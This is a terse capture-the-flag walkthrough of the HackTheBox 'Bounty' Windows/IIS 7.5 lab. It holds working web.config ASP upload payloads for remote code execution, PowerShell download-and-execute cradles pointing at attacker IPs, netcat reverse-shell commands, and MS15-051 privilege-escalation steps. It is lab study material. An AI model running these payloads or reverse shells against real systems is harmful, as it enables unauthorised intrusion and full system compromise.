# Bounty

- Windows 6.1.7600
- IIS 7 

- Transfert a IIS 7 web.config RCS
- MS15-051-64bits.exe
- ms10_092_schelevator

## Walkthrough
- https://www.boiteaklou.fr/HackTheBox-Bounty.html

## Nmap -> IIS 7.5

````
nmap -sC -sV 10.10.10.93
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
````
=> 80 : IIS 7.5


## IIS 7.5

Browse /<>

## dirb
````
dirb http://192.168.1.11 /usr/share/dirb/wordlists/vulns/iis.txt
````


## gobuster

````
gobuster -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .aspx,.asp,.html

$ gobuster -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -o gobuster/bounty

````

=> /transfert.aspx


## /transfert.aspx web.config

### IIS 7 web.config upload RCE

Googling “IIS 7.5 upload RCE” teaches us that ASP code can be executed by uploading a file called web.config.
RCE description : https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/

Upload web.config

Info on IIS 7 web.config : https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/

Upload .htaccess files attack : https://github.com/wireghoul/htshells

````
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Response.write("-"&"->")
Response.write(1+2)
Response.write("<!-"&"-")
%>

````
````
http://10.10.10.93/uploadfiles/web.config
3
````

### Payload : whoami
````
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("whoami")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>
````

Note : Payload in powershell
````
<%
on error resume next
Dim oS,output
Set oS = Server.CreateObject("WSCRIPT.SHELL")
output = oS.exec("cmd.exe > /c powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.13.75:8080/G783OPiDR3Em');").stdout.readall
Response.write("Powershell: " & vbCrLf & output & vbCrLf & vbCrLf)
%>
````


### Payload : download & execute Nishang
````
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.30:8000/shell.ps1')")
%>
-->
````
````
python -m SimpleHTTPServer 80
nv -lvp 4444

attrib *.* -h -s /s/d   : afiche les fichiers cachés
type user.txt


## Escalation

### Sherlock reco

serve Sherlock
````
curl https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1
python -m SimpleHTTPServer
````

Download & run it from PS shell
````
IEX (New-Object Net.WebClient).downloadString(‘http://10.10.14.23/priv.ps1’)
````


### MS15-051

Wget exploit
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
MS15-051-KB3045171
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip


Transfert file
New-Object Net.WebClient).DownloadFile(‘http://10.10.14.23/ms15-051×64.exe’,’c:\windows\temp\priv.exe‘

Transfert64bit nc
New-Object Net.WebClient).DownloadFile(‘http://10.10.14.23/nc64.exe’,’c:\windows\temp\nc.exe‘

Exploit
/priv.exe "c:\windows\temp\nc.exe -e cmd 10.10.14.23 1234"



### Other exploit : ms10_092_schelevator


Get wordlist from site
# cewl -w bobby_words.txt -v http://192.168.1.11

